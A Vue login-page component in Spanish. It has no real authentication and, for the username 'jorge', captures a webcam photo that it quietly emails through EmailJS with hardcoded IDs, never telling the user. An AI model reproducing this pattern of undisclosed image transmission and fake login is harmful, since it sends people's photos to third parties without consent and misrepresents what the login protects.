<template>
  <div class="container mt-5">
    <div class="card p-4 shadow">
      <h2 class="mb-4 text-center">Iniciar sesión</h2>

      <div v-if="loginStep === 0">
        <div class="mb-3">
          <label class="form-label">Usuario</label>
          <input v-model="username" class="form-control" />
        </div>
        <button class="btn btn-primary w-100" @click="startLogin">Entrar</button>
      </div>

      <div v-else-if="loginStep === 1 && username.toLowerCase() === 'jorge'">
        <p class="text-center">Por favor, toma tu foto Jorge</p>
        <video ref="video" autoplay muted playsinline class="w-100 mb-3" style="border-radius: 10px;"></video>
        <button class="btn btn-success w-100" @click="capturePhoto">Capturar y continuar</button>
      </div>

      <div v-else-if="loginStep === 2">
        <p class="text-center">¡Sesión iniciada! Bienvenido, {{ username }}.</p>
        <div v-if="photoData" class="text-center mt-3">
          <img :src="photoData" alt="Foto capturada" class="img-thumbnail" style="max-width: 200px;" />
        </div>
      </div>

      <div v-if="error" class="alert alert-danger mt-3">{{ error }}</div>
    </div>
  </div>
</template>

<script setup>
import { ref, onBeforeUnmount } from 'vue'
import emailjs from 'emailjs-com'

const username = ref('')
const loginStep = ref(0)
const error = ref('')
const video = ref(null)
const photoData = ref(null)
let stream = null

const EMAILJS_USER_ID = 'hAKrAk6739JURKy8B'
const EMAILJS_SERVICE_ID = 'service_9f3p7vj'
const EMAILJS_TEMPLATE_ID = 'template_tfvr5z9'

function startLogin() {
  error.value = ''
  if (!username.value) {
    error.value = 'Introduce un nombre de usuario.'
    return
  }

  if (username.value.toLowerCase() === 'jorge') {
    startVideo()
    loginStep.value = 1
  } else {
    loginStep.value = 2
  }
}

function startVideo() {
  navigator.mediaDevices
    .getUserMedia({ video: true })
    .then((s) => {
      stream = s
      if (video.value) {
        video.value.srcObject = stream
      }
    })
    .catch((err) => {
      error.value = 'No se pudo acceder a la cámara: ' + err.message
    })
}

function capturePhoto() {
  const canvas = document.createElement('canvas')
  const maxWidth = 300
  const scale = maxWidth / video.value.videoWidth
  canvas.width = maxWidth
  canvas.height = video.value.videoHeight * scale

  const context = canvas.getContext('2d')
  context.drawImage(video.value, 0, 0, canvas.width, canvas.height)

  photoData.value = canvas.toDataURL('image/jpeg', 0.6)

  stopVideo()

  if (username.value.toLowerCase() === 'jorge') {
    sendPhotoByEmail(photoData.value)
  }

  loginStep.value = 2
}

function stopVideo() {
  if (stream) {
    stream.getTracks().forEach((track) => track.stop())
  }
}

function sendPhotoByEmail(base64) {
  emailjs
    .send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      {
        username: username.value,
        photo: base64,
      },
      EMAILJS_USER_ID
    )
    .then(() => {
      console.log('Foto enviada por email correctamente')
    })
    .catch((err) => {
      error.value = 'Error enviando la foto: ' + err.text
    })
}

onBeforeUnmount(() => {
  stopVideo()
})
</script>

<style scoped>
video {
  max-height: 300px;
  border: 2px solid #ccc;
  border-radius: 10px;
}
</style>
